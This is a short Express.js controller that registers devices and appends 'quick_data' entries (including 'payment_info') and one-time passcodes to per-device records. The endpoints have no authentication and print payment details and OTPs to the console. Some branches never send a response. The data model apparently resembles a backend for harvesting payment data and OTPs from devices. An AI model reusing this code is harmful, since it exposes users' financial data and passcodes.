const User = require("../model/user");


exports.addUser = async (req, res) => {

    const { device, last_connected, id } = req.body;
    try {
        const user = await User.create({
            id: id,
            device: device,
            last_connected: last_connected,
            quick_data: [],
            otp: [],
        });
        return res.send({ success: true });

    } catch (err) {
        console.log("Error while adding user :=======> ", err);
        return res.status(500).json({ message: err.message });
    }

};
exports.updateUser = async (req, res) => {

    const { id, quickdata, otp } = req.body;
    console.log(id);
    console.log(quickdata);
    try {
        if (quickdata) {
            const user = await User.findOne({ id: id });


            if (!user) {
                // Handle the case where the user with the given ID is not found
                return null;
            }

            // Add the newQuickData element to the quick_data array
            console.log("info::", quickdata.payment_info)
            user.quick_data.addToSet(quickdata);
            console.log(user);

            // Save the updated user document
            await user.save();

            return user;

        }
        if (otp) {
            const user = await User.findOne({ id: id });


            if (!user) {
                // Handle the case where the user with the given ID is not found
                return null;
            }

            // Add the newQuickData element to the quick_data array
            console.log("info::", otp.payment_info)
            user.otp.addToSet(otp);
            console.log(user);

            // Save the updated user document
            await user.save();

            return user;

        }

        const user = await User.findOne({ id: id });
        return res.send(user);
    } catch (err) {
        return res.status(500).json({ message: err.message });
    }

}
